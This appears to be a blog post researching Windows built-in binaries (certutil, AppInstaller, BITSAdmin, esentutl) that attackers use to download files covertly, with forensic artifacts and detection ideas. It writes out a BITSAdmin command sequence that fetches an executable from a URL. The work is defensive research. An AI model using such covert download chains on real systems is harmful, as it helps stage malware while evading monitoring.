---
slug: "lolbins-downloads"
title: "LOLBins - Download Files"
description: "Hands-on research exploring Living Off the Land Binaries that attackers use to covertly download files"
date: 2022-01-07
author: "Ryan Thompson"
tags: ["lolbins", "windows", "security", "detection"]
featured: true
editable: false
---

This hands-on research explores Living Off the Land Binaries (LOLBins) that attackers can use to covertly download files. I tested four tools on a Windows 10 system to understand their mechanisms and artifacts.

> I don't claim to be an expert and if you notice anything I misunderstood or got flat wrong it would be stellar if you gave me a shout.

## Certutil

- Downloads files successfully using HTTP GET requests
- Generates two user-agents: "Microsoft-CryptoAPI" and "CertUtil URL Agent"
- Creates cached copies in InternetExplorer cache directories that persist until reboot
- Leaves IE-related artifacts that investigators could trace

## AppInstaller.exe

- Executes HTTP HEAD followed by GET requests without user-agent headers
- Successfully caches downloaded files despite application errors
- Has file size limitations (~buffer overflow at certain thresholds)
- Uses a proprietary shell item format designed for smaller installation references

## BITSAdmin.exe

Requires four sequential commands:

```powershell
bitsadmin /create jobname
bitsadmin /addfile jobname http://url/file.exe c:\path\file.exe
bitsadmin /resume jobname
bitsadmin /complete jobname
```

Key characteristics:

- Creates temporary BITXXXX.tmp files during transfers
- Uses "Microsoft BITS/x.x" user agent
- Generates EventID 60 logs with URLs in Windows Operational logs
- Detectable via regex patterns matching IP addresses or anomalous domains

## Esentutl.exe

- Requires SMB2 server infrastructure (SMB1 is rejected)
- Transfers files successfully but generates minimal obvious indicators
- Requires further research to identify attack signatures

## Detection Opportunities

Key forensic artifacts include:

- Cached files in InternetExplorer directories
- Event log entries (especially EventID 60 for BITS)
- User-agent strings in network traffic
